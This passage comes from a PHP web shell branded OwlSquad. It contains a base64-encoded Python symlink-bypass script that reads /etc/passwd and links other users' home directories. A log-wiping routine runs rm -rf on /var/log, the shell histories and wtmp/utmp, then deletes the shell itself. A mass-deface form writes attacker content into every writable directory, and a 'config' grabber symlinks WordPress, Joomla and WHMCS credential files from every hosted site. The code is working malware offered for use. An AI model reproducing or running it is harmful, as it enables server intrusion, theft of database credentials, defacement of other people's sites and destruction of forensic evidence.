	$sym_script = "Iy8qUHl0aG9uCgppbXBvcnQgdGltZQppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgcmUKCm9zLnN5c3RlbSgiY29sb3IgQyIpCgpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIgpmID0gIkFsbCBQcm9jZXNzZXMgRG9uZSFcblN5bWxpbmsgQnlwYXNzZWQgU3VjY2Vzc2Z1bGx5IVxuIgpwcmludCAiXG4iCnByaW50ICJ+Iio2MApwcmludCAiU3ltbGluayBCeXBhc3MgMjAxNCBieSBNaW5kbGVzcyBJbmplY3RvciAiCnByaW50ICIgICAgICAgICAgICAgIFNwZWNpYWwgR3JlZXR6IHRvIDogUGFrIEN5YmVyIFNrdWxseiIKcHJpbnQgIn4iKjYwCgpvcy5tYWtlZGlycygnc3ltcHknKQpvcy5jaGRpcignc3ltcHknKQoKc3Vzcj1bXQpzaXRleD1bXQpvcy5zeXN0ZW0oImxuIC1zIC8gN3lhWC50eHQiKQoKaCA9ICJPcHRpb25zIEluZGV4ZXMgRm9sbG93U3ltTGlua3NcbkRpcmVjdG9yeUluZGV4IDd5YVgucGh0bWxcbkFkZFR5cGUgdHh0IC5waHBcbkFkZEhhbmRsZXIgdHh0IC5waHAiCm0gPSBvcGVuKCIuaHRhY2Nlc3MiLCJ3KyIpCm0ud3JpdGUoaCkKbS5jbG9zZSgpCnByaW50IGh0YQoKc2YgPSAiPGh0bWw+PHRpdGxlPlN5bWxpbmsgUHl0aG9uPC90aXRsZT48Y2VudGVyPjxmb250IGNvbG9yPXdoaXRlIHNpemU9NT5TeW1saW5rIEJ5cGFzcyAyMDE3PGJyPjxmb250IHNpemU9ND5NYWRlIEJ5IE1pbmRsZXNzIEluamVjdG9yIDxicj5SZWNvZGVkIEJ5IDd5YVg8L2ZvbnQ+PC9mb250Pjxicj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTM+PHRhYmxlPiIKCm8gPSBvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3InKQpvPW8ucmVhZCgpCm8gPSByZS5maW5kYWxsKCcvaG9tZS9cdysnLG8pCgpmb3IgeHVzciBpbiBvOgoJeHVzcj14dXNyLnJlcGxhY2UoJy9ob21lLycsJycpCglzdXNyLmFwcGVuZCh4dXNyKQpwcmludCAiLSIqMzAKeHNpdGUgPSBvcy5saXN0ZGlyKCIvdmFyL25hbWVkIikKCmZvciB4eHNpdGUgaW4geHNpdGU6Cgl4eHNpdGU9eHhzaXRlLnJlcGxhY2UoIi5kYiIsIiIpCglzaXRleC5hcHBlbmQoeHhzaXRlKQpwcmludCBmCnBhdGg9b3MuZ2V0Y3dkKCkKaWYgIi9wdWJsaWNfaHRtbC8iIGluIHBhdGg6CglwYXRoPSIvcHVibGljX2h0bWwvIgplbHNlOgoJcGF0aCA9ICIvaHRtbC8iCmNvdW50ZXI9MQppcHM9b3BlbigiN3lhWC5waHRtbCIsInciKQppcHMud3JpdGUoc2YpCgpmb3IgZnVzciBpbiBzdXNyOgoJZm9yIGZzaXRlIGluIHNpdGV4OgoJCWZ1PWZ1c3JbMDo1XQoJCXM9ZnNpdGVbMDo1XQoJCWlmIGZ1PT1zOgoJCQlpcHMud3JpdGUoIjxib2R5IGJnY29sb3I9YmxhY2s+PHRyPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6d2hpdGU7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7PjxhIGhyZWY9N3lhWC50eHQvaG9tZS8lcyVzIHRhcmdldD1fYmxhbmsgPiVzPC9hPjwvdGQ+IiUoY291bnRlcixmdXNyLGZ1c3IscGF0aCxmc2l0ZSkpCgkJCWNvdW50ZXI9Y291bnRlcisx";
        $sym = fopen($file_sym, "w");
	fwrite($sym, base64_decode($sym_script));
	chmod($file_sym, 0755);
        $jancok = exe("python sym.py");
	echo "<br><center>Successfully Create Symlink Bypasser! <a href='OwlSquad_sympy/sympy/' target='_blank'>Klik Here</a>";
} elseif($_GET['do'] == 'hapus') {
  	echo '<br><center><b><span>Hapus Jejak!</span></b><center><br>';
	echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
	exec("rm -rf /tmp/logs");
	exec("rm -rf /root/.ksh_history");
	exec("rm -rf /root/.bash_history");
	exec("rm -rf /root/.bash_logout");
	exec("rm -rf /usr/local/apache/logs");
	exec("rm -rf /usr/local/apache/log");
	exec("rm -rf /var/apache/logs");
	exec("rm -rf /var/apache/log");
	exec("rm -rf /var/run/utmp");
	exec("rm -rf /var/logs");
	exec("rm -rf /var/log");
	exec("rm -rf /var/adm");
	exec("rm -rf /etc/wtmp");
	exec("rm -rf /etc/utmp");
	exec("rm -rf $HISTFILE");
	exec("rm -rf /var/log/lastlog");
	exec("rm -rf /var/log/wtmp");

	shell_exec("rm -rf /tmp/logs");
	shell_exec("rm -rf /root/.ksh_history");
	shell_exec("rm -rf /root/.bash_history");
	shell_exec("rm -rf /root/.bash_logout");
	shell_exec("rm -rf /usr/local/apache/logs");
	shell_exec("rm -rf /usr/local/apache/log");
	shell_exec("rm -rf /var/apache/logs");
	shell_exec("rm -rf /var/apache/log");
	shell_exec("rm -rf /var/run/utmp");
	shell_exec("rm -rf /var/logs");
	shell_exec("rm -rf /var/log");
	shell_exec("rm -rf /var/adm");
	shell_exec("rm -rf /etc/wtmp");
	shell_exec("rm -rf /etc/utmp");
	shell_exec("rm -rf $HISTFILE");
	shell_exec("rm -rf /var/log/lastlog");
	shell_exec("rm -rf /var/log/wtmp");

	passthru("rm -rf /tmp/logs");
	passthru("rm -rf /root/.ksh_history");
	passthru("rm -rf /root/.bash_history");
	passthru("rm -rf /root/.bash_logout");
	passthru("rm -rf /usr/local/apache/logs");
	passthru("rm -rf /usr/local/apache/log");
	passthru("rm -rf /var/apache/logs");
	passthru("rm -rf /var/apache/log");
	passthru("rm -rf /var/run/utmp");
	passthru("rm -rf /var/logs");
	passthru("rm -rf /var/log");
	passthru("rm -rf /var/adm");
	passthru("rm -rf /etc/wtmp");
	passthru("rm -rf /etc/utmp");
	passthru("rm -rf $HISTFILE");
	passthru("rm -rf /var/log/lastlog");
	passthru("rm -rf /var/log/wtmp");


	system("rm -rf /tmp/logs");
	sleep(2);
	echo'<br>Deleting .../tmp/logs ';
	sleep(2);

	system("rm -rf /root/.bash_history");
	sleep(2);
	echo'<p>Deleting .../root/.bash_history </p>';

	system("rm -rf /root/.ksh_history");
	sleep(2);
	echo'<p>Deleting .../root/.ksh_history </p>';

	system("rm -rf /root/.bash_logout");
	sleep(2);
	echo'<p>Deleting .../root/.bash_logout </p>';

	system("rm -rf /usr/local/apache/logs");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/logs </p>';

	system("rm -rf /usr/local/apache/log");
	sleep(2);
	echo'<p>Deleting .../usr/local/apache/log </p>';

	system("rm -rf /var/apache/logs");
	sleep(2);
	echo'<p>Deleting .../var/apache/logs </p>';

	system("rm -rf /var/apache/log");
	sleep(2);
	echo'<p>Deleting .../var/apache/log </p>';

	system("rm -rf /var/run/utmp");
	sleep(2);
	echo'<p>Deleting .../var/run/utmp </p>';

	system("rm -rf /var/logs");
	sleep(2);
	echo'<p>Deleting .../var/logs </p>';

	system("rm -rf /var/log");
	sleep(2);
	echo'<p>Deleting .../var/log </p>';

	system("rm -rf /var/adm");
	sleep(2);
	echo'<p>Deleting .../var/adm </p>';

	system("rm -rf /etc/wtmp");
	sleep(2);
	echo'<p>Deleting .../etc/wtmp </p>';

	system("rm -rf /etc/utmp");
	sleep(2);
	echo'<p>Deleting .../etc/utmp </p>';

	system("rm -rf $HISTFILE");
	sleep(2);
	echo'<p>Deleting ...$HISTFILE </p>'; 

	system("rm -rf /var/log/lastlog");
	sleep(2);
	echo'<p>Deleting .../var/log/lastlog </p>';

	system("rm -rf /var/log/wtmp");
	sleep(2);
	echo'<p>Deleting .../var/log/wtmp </p>';

	sleep(4);

	echo '<br><br><p>Access Logs Has Been Successfully Deleted ...From the Server';
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<center><br><center><h2>Shell Deleted</h2></center></center>');
		else
			echo '<center>Remove Shell Failed!</center>';
	echo"</td></tr></table>";
} elseif($_GET['do'] == 'mass_deface') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=#4c83af>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=#4c83af>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='owlsquad.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Berandal | OwlSquad</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
}  elseif($_GET['do'] == 'config') {
	$idx = mkdir("OwlSquad_config", 0777);
	$isi_htc = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
	$htc = fopen("OwlSquad_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	fclose($htc);
	if(preg_match("/vhosts|vhost/", $dir)) {
		$link_config = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
		$vhost = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpvcGVuZGlyKG15ICRkaXIgLCAiL3Zhci93d3cvdmhvc3RzLyIpOw0KZm9yZWFjaChzb3J0IHJlYWRkaXIgJGRpcikgew0KICAgIG15ICRpc0RpciA9IDA7DQogICAgJGlzRGlyID0gMSBpZiAtZCAkXzsNCiRzaXRlc3MgPSAkXzsNCg0KDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3Atb3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb20vaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2UudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2VzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXNob3BwaW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNhbGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJHNpdGVzcy4nLWFtZW1iZXIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLmluYy5waHAnLCRzaXRlc3MuJy1hbWVtYmVyMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXJzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictbWVtYmVycy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlczEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictZm9ydW1zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FkbWluL2NvbmYucGhwJywkc2l0ZXNzLictNS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictNC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dwL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvV1Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLXByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2cvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLW5ldy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9nL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9ncy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLWJsb2dzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Byb3RhbC93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3Mtc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYWluL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy90ZXN0L3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtdGVzdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJjYWRlL2Z1bmN0aW9ucy9kYmNsYXNzLnBocCcsJHNpdGVzcy4nLWlicHJvYXJjYWRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9qb28vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb28udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLWNtcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1tYWluLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtaG9tZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmJ+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIzfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jYy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIxfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobTE1LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0td2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLVdITUNTLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNwYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXBhbmVsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VibWl0dGlja2V0LnBocCcsJHNpdGVzcy4nLXdobWNzMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0